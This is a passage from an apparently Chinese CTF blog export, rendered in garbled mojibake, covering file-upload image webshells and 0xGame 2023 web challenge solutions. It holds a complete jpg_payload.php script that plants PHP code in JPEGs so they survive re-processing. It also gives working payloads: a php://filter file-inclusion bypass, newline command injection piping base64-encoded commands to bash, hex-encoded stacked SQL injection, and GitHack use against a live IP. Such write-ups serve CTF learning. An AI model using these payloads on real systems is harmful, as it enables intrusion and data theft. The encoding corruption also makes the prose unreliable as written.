å‡½æ•°å°†ç”Ÿæˆçš„å›¾åƒä¿å­˜ä¸ºåä¸º \"1.png\" çš„æ–‡ä»¶ã€‚ imagepng($img,'./1.png'); ?&gt; è¿è¡Œåå¾—åˆ°1.png.ä¸Šä¼ åä¸‹è½½åˆ°æœ¬åœ°æ‰“å¼€å¦‚ä¸‹å›¾â€“å¤§ç‰›å°±æ˜¯ç‰›å•Šï¼Œæˆ‘éƒ½ä¸çŸ¥é“è¿™æœ¨é©¬å¦‚ä½•å†™ä¸Šå»çš„ã€‚ã€‚ã€‚ è¿™ç§æ–¹æ³•åœ¨åšé¢˜çš„æ—¶å€™æµ®ç°è¿‡äº†ï¼Œæ­¤å¤„å°±ä¸åœ¨èµ˜è¿°äº† 2.3 ä¸Šä¼ JPG è¿™é‡Œä¹Ÿé‡‡ç”¨å›½å¤–å¤§ç‰›ç¼–å†™çš„è„šæœ¬jpg_payload.php &lt;?php /* The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled(). It is necessary that the size and quality of the initial image are the same as those of the processed image. 1) Upload an arbitrary image via secured files upload script 2) Save the processed image and launch: jpg_payload.php &lt;jpg_name.jpg&gt; In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = \"&lt;?=phpinfo();?&gt;\"; if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { die('php-gd is not installed'); } if(!isset($argv[1])) { die('php jpg_payload.php &lt;jpg_name.jpg&gt;'); } set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad &lt; 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if($dis-&gt;readShort() != 0xFFD8) { die('Incorrect SOI marker'); } while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) { $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if($marker === 0xDA) { $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis-&gt;eof())) { if($dis-&gt;readByte() === 0xFF) { if($dis-&gt;readByte !== 0x00) { break; } } } $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage('payload_'.$argv[1], $outStream)) { die('Success!'); } else { break; } } } } unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-&gt;binData = ''; $this-&gt;order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this-&gt;binData = file_get_contents($filename); } else { $this-&gt;binData = $filename; } $this-&gt;size = strlen($this-&gt;binData); } public function seek() { return ($this-&gt;size - strlen($this-&gt;binData)); } public function skip($skip) { $this-&gt;binData = substr($this-&gt;binData, $skip); } public function readByte() { if($this-&gt;eof()) { die('End Of File'); } $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); } public function readShort() { if(strlen($this-&gt;binData) &lt; 2) { die('End Of File'); } $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if($this-&gt;order) { $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); } else { $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); } return $short; } public function eof() { return !$this-&gt;binData||(strlen($this-&gt;binData) === 0); } } ?&gt; ä½¿ç”¨æ–¹æ³•ï¼šéšä¾¿æ‰¾ä¸€ä¸ªjpgå›¾ç‰‡ï¼Œå…ˆä¸Šä¼ è‡³æœåŠ¡å™¨ç„¶åå†ä¸‹è½½åˆ°æœ¬åœ°ä¿å­˜ä¸º1.jpg. æ’å…¥phpä»£ç  ä½¿ç”¨è„šæœ¬å¤„ç†1.jpg,å‘½ä»¤php jpg_payload.php 1.jpg è¿™é‡Œå°è¯•äº†å¥½å‡ æ¬¡ï¼Œä¼¼ä¹åªèƒ½åœ¨ç»ˆç«¯ä¸Šè¿è¡Œï¼Œè€Œä¸”å‘½ä»¤å¿…é¡»ä¸€æ¨¡ä¸€æ ·ï¼Œä¹Ÿå°±æ˜¯phpæ–‡ä»¶å’Œ1.jpgå’Œphp.exeéœ€è¦åœ¨åŒä¸€ç›®å½•ä¸‹ ä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€,å°±å¯ä»¥çœ‹åˆ°æ’å…¥çš„phpä»£ç  ä¸è¿‡è¿™é‡Œå›°æƒ‘çš„æ˜¯æ‰§è¡Œå®Œå‘½ä»¤äº§ç”Ÿçš„å›¾ç‰‡ä¸­æ’å…¥çš„ä»£ç ä¸å…¨ï¼Œè¿™é‡Œå¦‚ä¸Šå›¾ä¹‹å‰æ˜¯æ²¡æœ‰postçš„ï¼Œåªå­˜åœ¨ è¿™é‡Œçš„postæ˜¯æˆ‘ä¹‹åå¡«ä¸Šå»çš„ï¼Œä¸è¿‡æµ‹è¯•è¿‡åä¼¼ä¹æ²¡å½±å“ ä¸Šä¼ å›¾ç‰‡é©¬ å°†ç”Ÿæˆçš„payload_1.jpgä¸Šä¼ . è¿™é‡Œä¹Ÿæ˜¯æˆåŠŸä¸Šä¼ è§£æã€‚ è¿™é‡Œæœ‰å¸ˆå‚…æé†’ï¼šéœ€è¦æ³¨æ„çš„æ˜¯,æœ‰ä¸€äº›jpgå›¾ç‰‡ä¸èƒ½è¢«å¤„ç†,æ‰€ä»¥è¦å¤šå°è¯•ä¸€äº›jpgå›¾ç‰‡. æ¥ä¸‹æ¥å°±å¼€å§‹å­¦ä¹ mysqlä¸­çš„é¢„ç¼–è¯‘å§ï¼Œæµ…æµ…äº†è§£ä¸€ä¸‹ã€‚ 0x03 å‚è€ƒæ–‡ç«  æ–‡ä»¶ä¸Šä¼ æ¼æ´ upload-labsä¹‹pass 16è¯¦ç»†åˆ†æ --éå¸¸è¯¦ç»†","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"0xGame 2023","path":"/2023/10/22/0xgame-2023/","content":"0x01 å‰è¨€ æ–°ç”Ÿèµ›çœŸçš„å¤šï¼Œå‰ä¸¤å‘¨åšçš„æ—¶å€™è¿˜å¿ƒæƒ…èˆ’ç•…ï¼Œç¬¬ä¸‰å‘¨å°±å¼€å§‹åç‰¢äº†ï¼Œâ”­â”®ï¹â”­â”®ï¼Œå¤ªèœäº†ï¼Œæ–°ç”Ÿèµ›ä¹Ÿæ‰“ä¸è¿‡ã€‚ä¿—è¯è¯´å¾—å¥½ï¼šæ‰“ä¸è¿‡æˆ‘è¿˜ä¸ä¼šæŠ„å—ï¼ˆç‹—å¤´ï¼‰ï¼Œæˆ‘ç›´æ¥ç…§ç€wpå¼€å·ï¼ï¼ï¼ ä¸è¿‡è¿™ä¸ª0xgameçš„æ¯”èµ›æˆ‘åªèƒ½è¯´ï¼Œä½“éªŒæ„Ÿæœ‰ç‚¹å·®ï¼ŒçœŸå¿ƒè§‰å¾—ä¸å¦‚åŠ¨æ€é¶æœºèˆ’æœï¼ˆè€Œä¸”é¢˜ç›®è¿˜éš¾ï¼ï¼ï¼ï¼‰ [Week 1] signin ![image-20231022153622957](0xGame 2023/image-20231022153622957.png) é¦–å…ˆæ‰“å¼€ä¹‹åæ˜¯ä¸€ä¸ªç®€å•çš„é¡µé¢ï¼Œè¿™é‡Œé¡µé¢è¿˜è¯´ä½ èƒ½æ‰¾åˆ°flagå—ï¼Ÿ-å‘µå‘µï¼Œæˆ‘tmå½“ç„¶æ‰¾ä¸åˆ°äº†ã€‚ã€‚ã€‚ è¿™é‡Œå‘¢æˆ‘å°è¯•æŠ“åŒ…ä»¥åŠdirsearchæ‰«ç›®å½•å‡æ— æœï¼Œå½“æ—¶å°±ç„¦è™‘äº†ï¼Œæˆ‘æƒ³ç€tmç¬¬ä¸€å‘¨çš„æ–°æ‰‹é¢˜å°±ä¸ä¼šäº†ï¼Ÿï¼Ÿï¼Ÿä¹‹åä¸€ä¸‹æƒ³åˆ°F12æ‰“å¼€æŠ“ä¸ªåŒ…çœ‹çœ‹æ˜¯å¦æœ‰ä¿¡æ¯ï¼Œå—¨ï¼Œæƒ³ä¸åˆ°çœŸæœ‰ ![image-20231022154409249](0xGame 2023/image-20231022154409249.png) F12å¼€å¯æ§åˆ¶å°éšåé‡æ–°åˆ·æ–°ä¸€ä¸‹é¡µé¢æŠ“åŒ…ï¼Œè¿™é‡Œå‘ç°æœ‰é¡µé¢çš„jsæ–‡ä»¶æºç ï¼Œè¿™æ—¶æˆ‘å°±è®¤ä¸ºå¤§æ¦‚ç‡å°±æ˜¯æ­¤å¤„äº†å“ˆå“ˆ ![image-20231022154505505](0xGame 2023/image-20231022154505505.png) ä¸€ç•ªæœç´¢å‘ç°flagæœç„¶åœ¨æ­¤jsæ–‡ä»¶ä¸‹ã€‚ [Week 1] baby_php &lt;?php // flag in flag.php highlight_file(__FILE__); if (isset($_GET['a']) &amp;&amp; isset($_GET['b']) &amp;&amp; isset($_POST['c']) &amp;&amp; isset($_COOKIE['name'])) { $a = $_GET['a']; $b = $_GET['b']; $c = $_POST['c']; $name = $_COOKIE['name']; if ($a != $b &amp;&amp; md5($a) == md5($b)) { if (!is_numeric($c) &amp;&amp; $c != 1024 &amp;&amp; intval($c) == 1024) { include($name.'.php'); } } } ?&gt; ç®€å•çš„PHPç‰¹æ€§ï¼Œè¿™é‡Œé¦–å…ˆè¦æ±‚ä¼ å…¥çš„aã€bå‚æ•°ä¸ç›¸ç­‰ï¼Œä½†md5åŠ å¯†åçš„å€¼è¦ç›¸ç­‰ï¼Œæˆ‘ä»¬ç›´æ¥æ•°ç»„ç»•è¿‡å³å¯ã€‚ å…¶æ¬¡åœ¨æ¥ç€åˆ¤æ–­cå‚æ•°æ˜¯å¦æ˜¯æ•°å­—ï¼Œåªæœ‰cæ»¡è¶³ä¸æ˜¯æ•°å­—ï¼Œä¸”cä¸ç­‰äº1024ï¼Œä¸”cç»è¿‡intvalå–æ•´åç­‰äº1024å³å¯åŒ…å«flag.phpæ–‡ä»¶ é‚£é¦–å…ˆæ˜¯ç»•è¿‡is_numericå‡½æ•° is_numericå‡½æ•°å¯¹äºç©ºå­—ç¬¦%00ï¼Œæ— è®ºæ˜¯%00æ”¾åœ¨å‰åéƒ½å¯ä»¥åˆ¤æ–­ä¸ºéæ•°å€¼ï¼Œè€Œ%20ç©ºæ ¼å­—ç¬¦åªèƒ½æ”¾åœ¨æ•°å€¼å æ ¹æ®ä¸Šè¿°æˆ‘ä»¬å¯ä»¥å®ç°ç»•è¿‡ï¼Œä¸è¿‡è¿™é‡Œç›´æ¥åœ¨åé¢+å…¶ä»–å­—ç¬¦å¦‚aä¹Ÿå¯ä»¥ã€‚ å…¶æ¬¡æ˜¯$c != 1024 &amp;&amp; intval($c) == 1024è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰å–æ•´å‡½æ•°ï¼Œé‚£æˆ‘ä»¬åº”è¯¥æƒ³åˆ°å°†cèµ‹å€¼ä¸ºæµ®ç‚¹ç±»å‹ï¼Œè¿™æ ·å°±å¯ä»¥æˆåŠŸç»•è¿‡ï¼Œå¹¶ä¸” intval ä¹Ÿä¼šæˆªæ–­éæ•°å­—çš„éƒ¨åˆ† æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š GETï¼š?a[]=1&amp;b[]=2 POSTï¼šc=1024.1a cookieï¼šname=php://filter/convert.base64-encode/resource=flag è‡³äºä¸ºä½•è¿™é‡Œè¦ç”¨phpä¼ªåè®®è¯»å–ï¼Œæˆ‘çŒœæµ‹æ˜¯å¦‚æœç›´æ¥èµ‹å€¼ä¸ºflag.phpçš„è¯ï¼Œinlcudeä¼šæ‰§è¡Œphpæ–‡ä»¶ä¸­çš„ä»£ç ï¼Œå¯¼è‡´æœ€ç»ˆç»“æœä¸å¯è§ï¼Œæ•…æ­¤é€‰æ‹©ä¼ªåè®®è¯»å–ï¼Œå°†æ–‡ä»¶å†…å®¹è¿›è¡Œbase64ç¼–ç å¯¼è‡´å…¶ä¸å¯æ‰§è¡Œæœ€ç»ˆå›æ˜¾å‡ºæ¥ ![image-20231022160313639](0xGame 2023/image-20231022160313639.png) å¦‚ä¸Šå›¾ç›´æ¥base64è§£ç å³å¯ [Week 1] hello_http ![image-20231022160421773](0xGame 2023/image-20231022160421773.png) è¿™é‡Œè€ƒå¯ŸhttpåŸºç¡€çŸ¥è¯†ï¼Œæ ¹æ®é¡µé¢ä¿¡æ¯æˆ‘ä»¬é€‰æ‹©getä¼ å‚queryä¸ºctf ![image-20231022160629635](0xGame 2023/image-20231022160629635.png) æ¥ç€è®©æˆ‘ä»¬postä¼ å‚actionä¸ºgetflag ![image-20231022160651994](0xGame 2023/image-20231022160651994.png) åˆæç¤ºæˆ‘ä»¬ä¸æ˜¯adminï¼Œè¿™é‡Œè¿˜æ˜¯ç›´æ¥ä¸Šbpå§ ![image-20231022160725124](0xGame 2023/image-20231022160725124.png) å‘ç°æ•æ„Ÿè¯roleï¼Œæˆ‘ä»¬å°†å…¶ä¿®æ”¹ä¸ºadmin ![image-20231022160754322](0xGame 2023/image-20231022160754322.png) æ­¤æ—¶åˆæç¤ºæˆ‘ä»¬ä¸æ˜¯å†…ç½‘ipï¼Œé‚£æˆ‘ä»¬ç”¨xffå¤´ä¿®æ”¹ä¸€ä¸‹çœ‹çœ‹ ![image-20231022160844324](0xGame 2023/image-20231022160844324.png) è¿™æ—¶æç¤ºæˆ‘ä»¬uaå¤´ä¸æ˜¯æŒ‡å®šçš„ï¼Œé‚£æˆ‘ä»¬ç›´æ¥ä¿®æ”¹å³å¯ ![image-20231022160917710](0xGame 2023/image-20231022160917710.png) æœ€ååˆæç¤ºæˆ‘ä»¬refererå¤´æ¥æºä¸æ­£ç¡®ï¼Œé‚£æˆ‘ä»¬ç»§ç»­ä¿®æ”¹ ![image-20231022161019184](0xGame 2023/image-20231022161019184.png) æ‹¿åˆ°flag [Week 1] repo_leak ![image-20231022161204842](0xGame 2023/image-20231022161204842.png) å¦‚ä¸Šå›¾ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹é¢˜ç›®åç§°å°±å¯ä»¥çŒœåˆ°åº”è¯¥æ˜¯ä¿¡æ¯æ³„éœ²ï¼Œæ­¤æ—¶dirsearchæ‰«ä¸€ä¸‹çœ‹çœ‹ ![image-20231022161318450](0xGame 2023/image-20231022161318450.png) å¦‚å›¾å‘ç°å¾ˆå¤šå…³äºgitæ³„éœ²çš„ä¸œè¥¿ï¼Œè¿™é‡Œç›´æ¥ä¸Šå·¥å…·å»åˆ©ç”¨æ¼æ´ï¼š ä½¿ç”¨githackç­‰å·¥å…·ä¸‹è½½ç«™ç‚¹å­˜å‚¨åº“çš„æ•´ä¸ªä»£ç å†å²è®°å½•å’Œé…ç½®ä¿¡æ¯ã€‚ GitHub - lijiejie/GitHack: A .git folder disclosure exploit ä¸‹è½½åœ°å€å¦‚ä¸Šï¼Œæ³¨æ„æ˜¯python2ç¯å¢ƒï¼Œå…·ä½“ç”¨æ³•å‚è€ƒï¼š Gitæ³„éœ²æ€»ç»“ ç”¨æ³•å¦‚ä¸‹ï¼šåœ¨å·¥å…·æ‰€åœ¨ç›®å½•æ‰“å¼€cmd python2 GitHack.py http://120.27.148.152:50013/.git/ ![image-20231022162258605](0xGame 2023/image-20231022162258605.png) ![image-20231022163523977](0xGame 2023/image-20231022163523977.png) éšåè¿›å…¥ç›®æ ‡urlæ‰€åœ¨ç›®å½• ![image-20231022163541284](0xGame 2023/image-20231022163541284.png) é¦–å…ˆæŸ¥çœ‹ä¸€ä¸‹gitæ—¥å¿—ï¼Œå¯ä»¥çœ‹åˆ°å“ªä¸€ä¸ªäººåœ¨å“ªä¸ªæ—¶é—´æäº¤äº†é‚£ä¸€ä¸ªæ–‡ä»¶ï¼Œæ¯ä¸€ä¸ªcommitéƒ½ä¼šç”Ÿæˆä¸€ä¸ªå“ˆå¸Œå€¼ï¼Œè¿™ä¸ªå€¼æ˜¯å”¯ä¸€çš„ï¼Œç›¸å½“äºcommitçš„èº«ä»½è¯ è¿™é‡Œå¯ä»¥çœ‹åˆ°åœ¨ ç¬¬äºŒæ¬¡æäº¤çš„æ—¶å€™çœ‹åˆ°å…¶æäº¤äº†flagï¼Œé‚£æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ ![image-20231022163710703](0xGame 2023/image-20231022163710703.png) git reflogï¼šå¯ä»¥æŸ¥çœ‹è¿‘æœŸæ‰€æœ‰çš„æäº¤è®°å½•ï¼Œè¿™æ ·å°±å¯ä»¥å›æ»šåˆ°ä»»æ„ä¸€ä¸ªç‰ˆæœ¬ æ¥ä¸‹æ¥æŸ¥çœ‹flagæ‰€åœ¨çš„8a5b670ï¼šgit show 8a5b670 ![image-20231022163941388](0xGame 2023/image-20231022163941388.png) å¯ä»¥è¿›ä¸€æ­¥æŸ¥çœ‹æäº¤çš„æ–‡ä»¶å†…å®¹ï¼Œæ‰¾åˆ°flag [Week 1] ping ![image-20231022164257042](0xGame 2023/image-20231022164257042.png) æ‰“å¼€æ˜¯ä¸€ä¸ªpingå‘½ä»¤æ‰§è¡Œé¡µé¢ï¼Œæˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹æºç çœ‹çœ‹æœ‰ä»€ä¹ˆä¿¡æ¯ ![image-20231022164321959](0xGame 2023/image-20231022164321959.png) æœç„¶è¿™é‡Œæç¤ºæˆ‘ä»¬è®¿é—®ä¸€ä¸‹api.php &lt;?php function sanitize($s) { $s = str_replace(';', '', $s); $s = str_replace(' ', '', $s); $s = str_replace('/', '', $s); $s = str_replace('flag', '', $s); return $s; } if (isset($_GET['source'])) { highlight_file(__FILE__); die(); } if (!isset($_POST['ip'])) { die('No IP Address'); } $ip = $_POST['ip']; $ip = sanitize($ip); if (!preg_match('/((\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])\\.){3}(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])/', $ip)) { die('Invalid IP Address'); } system('ping -c 4 '.$ip. ' 2&gt;&amp;1'); ?&gt; ç»“æœå‘ç°è¿™é‡Œæ˜¯å‰é¢pingé¡µé¢çš„æºç ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†åˆ†å·ï¼Œç©ºæ ¼ï¼Œæ–œæ ä»¥åŠflagå…³é”®è¯ï¼Œä¸è¿‡è¿™é‡Œå¯¹æˆ‘ä»¬ä¼ å…¥çš„ipæ‰§è¡Œäº†æ­£åˆ™çš„è¿‡æ»¤ï¼Œè¿™é‡Œè¿‡æ»¤çš„å¾ˆå…¨ï¼Œä¼¼ä¹æ˜¯åªå…è®¸æ•°å­—çš„ï¼Œè¿™é‡Œæˆ‘ä»¬å°è¯•æ¢è¡Œç»•è¿‡ å…ˆæä¸€ä¸ªå¯¹ä¸Šè¿°æ­£åˆ™çš„è§£é‡Šï¼š æ•´ä¸ªæ­£åˆ™è¡¨è¾¾å¼ç”¨äºåŒ¹é…IPv4åœ°å€çš„æ‰€æœ‰å››ä¸ªéƒ¨åˆ†ï¼Œç¡®ä¿æ¯ä¸ªéƒ¨åˆ†çš„å€¼åœ¨0åˆ°255ä¹‹é—´ï¼Œä¸”ç”¨ç‚¹å·åˆ†éš”ã€‚è¿™æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„IPv4åœ°å€éªŒè¯æ­£åˆ™è¡¨è¾¾å¼ã€‚ payloadï¼š ip=127.0.0.1%0als ![image-20231022165222349](0xGame 2023/image-20231022165222349.png) å¦‚ä¸Šå›¾çœ‹åˆ°æˆåŠŸæ‰§è¡Œï¼Œé‚£ç°åœ¨å°±æ˜¯è€ƒè™‘å¦‚æœç»•è¿‡è¿‡æ»¤è¯»å–åˆ°flagäº†ï¼Œè¿™é‡Œè‚¯å®šå°±è¦ç”¨åˆ°ç¼–ç ä¹‹ç±»çš„ ç©ºæ ¼è¿‡æ»¤çš„è¯æˆ‘ä»¬å¯ä»¥ç”¨&lt;&gt;æˆ–è€…${IFS}ç­‰ç­‰ï¼Œè‡³äºåˆ†å·çš„è¿‡æ»¤ï¼ˆå¤§æ¦‚ç‡æ˜¯é¿å…æˆ‘ä»¬çš„å˜é‡æ‹¼æ¥å§ï¼‰è¿™é‡Œç½‘ç«™æ–‡ç« ç¿»ç¿»å‘ç°base64ç¼–ç å°±å¯ä»¥ç»•è¿‡ echo \"bHMgLw==\"|base64 -d|bash ==&gt;ls / echo \"Y2F0IC9mbGFn\"|base64 -d|bash ==&gt;cat /flag æ³¨æ„ä¸Šè¿°çš„payloadä¹‹å‰çš„ç©ºæ ¼ç¬¦ç”¨${IFS}ä»£æ›¿å³å¯ç»•è¿‡ ![image-20231022165608398](0xGame 2023/image-20231022165608398.png) ![image-20231022165735258](0xGame 2023/image-20231022165735258.png) æ‹¿åˆ°flag [Week 2] ez_sqli ![image-20231022170307981](0xGame 2023/image-20231022170307981.png) éšååœ¨ä¸‹è½½é¢˜ç›®ç»™çš„é™„ä»¶ï¼Œæ˜¯ä¸€ä¸²pythonæºç  from flask import Flask, render_template, request import MySQLdb import re blacklist = ['select', 'update', 'insert', 'delete', 'database', 'table', 'column', 'alter', 'create', 'drop', 'and', 'or', 'xor', 'if', 'else', 'then', 'where'] conn = MySQLdb.connect(host='db', port=3306, user='root', passwd='root', db='ctf') app = Flask(__name__) @app.route('/') def index(): field = request.args.get('order', 'id') field = re.sub(r'\\s+', '', field) for s in blacklist: if s.lower() in field.lower(): return s + ' are banned' if not re.match(r\"id|name|email\", field): field = 'id' with conn.cursor() as cursor: cursor.execute('SELECT * FROM userinfo order by %s' % field) res = cursor.fetchall() return render_template('index.html', res=res) if __name__ == '__main__': app.run(host='0.0.0.0', port=8000, debug=True) è¿™é‡Œå‘¢è®¾ç½®äº†é»‘åå•è¿‡æ»¤äº†å¾ˆå¤šæ•æ„Ÿè¯ï¼Œä¹‹åå¦‚æœè®¿é—®/è·¯ç”±çš„è¯ï¼Œæˆ–è‡ªåŠ¨æ‰§è¡Œindexå‡½æ•° éšåæ£€æŸ¥getå‚æ•°çš„orderå’Œidï¼Œéå†é»‘åå•æ•°ç»„æŸ¥çœ‹æ˜¯å¦å­˜åœ¨æ•æ„Ÿå­—è¯ã€‚æ¥ç€æŸ¥çœ‹ä¼ å…¥çš„fieldæ˜¯å¦æ˜¯idï¼Œnameï¼Œemailä¸­çš„ä¸€ä¸ªï¼Œå¦‚æœä¸æ˜¯åˆ™é»˜è®¤é…ç½®ä¸ºidï¼Œä¹‹åæ‰§è¡Œ sqlè¯­å¥æ ¹æ®fieldå†…å®¹æŸ¥æ‰¾å›æ˜¾å†…å®¹ è¿™é‡Œåˆ†æå®Œä¹‹åæˆ‘ä¾æ—§æ²¡ä»€ä¹ˆæ€è·¯ï¼Œå¤ªèœäº†ï¼Œè¿™é‡Œä¹Ÿæ˜¯çœ‹äº†hintå‘ç°å¯ä»¥å †å æ³¨å…¥ï¼Œä»–è¯´æ˜¯æ•æ„Ÿå‡½æ•°cursor.executeå¯ä»¥ æ‰§è¡Œå¤šæ¡sqlè¯­å¥ï¼Œäº‹åè¯¸è‘›äº®çš„æˆ‘æ‚Ÿäº†ï¼Œçœ‹æ¥æ—¥ååˆ†æä»£ç æ—¶ï¼Œä¹Ÿè¦æœå¯»ç›¸å…³å‡½æ•°çš„ç”¨æ³•æ¥æ‰¾æ¼æ´ã€‚ æ—¢ç„¶æç¤ºæˆ‘ä»¬æ˜¯å †å æ³¨å…¥ï¼Œä¸”å…¶ä¸­é»‘åå•è¿‡æ»¤çš„å¾ˆå¤šä»¥åŠsubå»æ‰äº†ç©ºç™½å­—ç¬¦ï¼ˆä¹Ÿå°±æ˜¯è¿‡æ»¤ç©ºæ ¼ï¼‰ï¼Œå› æ­¤è¿™é‡Œæˆ‘åˆæ²¡æ€è·¯äº†ï¼Œåªèƒ½çœ‹wpäº†ï¼Œå‘ç°å…¶åˆ©ç”¨çš„æ˜¯mysqlé¢„å¤„ç†çŸ¥è¯†ï¼Œä½†æˆ‘è¿˜æ²¡ä»”ç»†å­¦è¿‡ï¼Œå› æ­¤è¿™é‡Œæˆ‘ç›´æ¥å¤§æ¦‚äº†è§£ä¸€ä¸‹ä¸Šä¸ªpayloadï¼Œä¹‹åè®¤çœŸå­¦ä¹ ä¸€ç•ªï¼ˆæœ€è¿‘äº‹æƒ…å¥½å¤šï¼ŒçœŸç´¯å•Š~~ï¼‰ wpè®²çš„ï¼š è€ƒå¯Ÿ MySQL å †å æ³¨â¼Š + é¢„å¤„ç†è¯­å¥ç»•è¿‡ WAF â¿Šåå•è¿‡æ»¤äº†å¸¸â»…çš„ SQL å…³é”®è¯, æ­£å¸¸æ²¡åŠæ³•è¿›â¾ SQL æ³¨â¼Š, sqlmap ä¹Ÿè·‘ä¸å‡ºæ¥ â¾¸å…ˆå¾—çŸ¥é“ mysqlclient (MySQLdb) çš„ cursor.execute() â½€æŒæ‰§â¾å¤šæ¡ SQL è¯­å¥, è¿™ä¸ªä¹Ÿç»™äº† hint ç„¶å, MySQL â½€æŒ SQL è¯­å¥çš„é¢„å¤„ç† (set prepare execute), è¿™ä¸ªâ½¹ä¸Šæœæœä¹Ÿèƒ½æ‰¾åˆ°å¯¹åº”çš„â½‚ç« å’Œ payload é¢„å¤„ç†è¯­å¥å¦‚ä¸‹ï¼š prepare stmt from 'SELECT * FROM users WHERE id=?'; set @id=1; execute stmt using @id; è¿™é‡Œæˆ‘ä»¬ç”¨æŠ¥é”™æ³¨å…¥å»æï¼Œä½†æŠ¥é”™æ³¨å…¥å›æ˜¾å†…å®¹æœ‰é™ï¼Œ # step 1 select updatexml(1,concat(0x7e,(select substr((select flag from flag),1,31)),0x7e),1); # step 2 select updatexml(1,concat(0x7e,(select substr((select flag from flag),31,99)),0x7e),1); è¿™é‡Œç”±äºé»‘åå•çš„å­˜åœ¨ï¼Œå› æ­¤wpå°†å…¶è¿›è¡Œäº†ASCIIç 16è¿›åˆ¶ç¼–ç ç»•è¿‡ï¼š # step 1 id;set/**/@a=0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65 637420737562737472282873656c65637420666c61672066726f6d20666c6167292c312c333129292c30783 765292c31293b;prepare/**/stmt/**/from/**/@a;execute/**/stmt; # step 2 id;set/**/@a=0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65 637420737562737472282873656c65637420666c61672066726f6d20666c6167292c33312c393929292c307 83765292c31293b;prepare/**/stmt/**/from/**/@a;execute/**/stmt; emmmå¤§æ¦‚åŸç†æ˜¯setä¸€æ¡å¾…æ‰§è¡Œè¯­å¥ï¼Œéšåå°†å…¶ç½®å…¥prepareé¢„å¤„ç†ä¸­ï¼Œæ¥ç€executeæ‰§è¡Œï¼ˆä¹Ÿæ²¡ä»”ç»†å­¦ï¼Œè¯´é”™äº†åˆ«æ‰“â”­â”®ï¹â”­â”®ï¼‰ ![image-20231022174720144](0xGame 2023/image-20231022174720144.png) ![image-20231022174737683](0xGame 2023/image-20231022174737683.png) æ‰¾åˆ°flag [Week 2] ez_upload ![image-20231022221053241](0xGame 2023/image-20231022221053241.png) æ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œæˆ‘ä»¬ä¸‹è½½é™„ä»¶å¯ä»¥çœ‹åˆ°å¯¹åº”æºç ï¼Œé‚£ç›´æ¥åˆ†æä¸€æ³¢ index.php &lt;?php session_start(); $user_dir = md5($_SERVER['REMOTE_ADDR']); if (!file_exists('uploads/'.$user_dir)) { mkdir('uploads/'.$user_dir); } ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;Gravatar&lt;/title&gt; &lt;script src=\"https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js\"&gt;&lt;/script&gt; &lt;script src=\"https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.2.3/js/bootstrap.min.js\"&gt;&lt;/script&gt; &lt;link href=\"https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.2.3/css/bootstrap.min.css\" rel=\"stylesheet\"&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"container pt-5 p-5 my-5 border\"&gt; 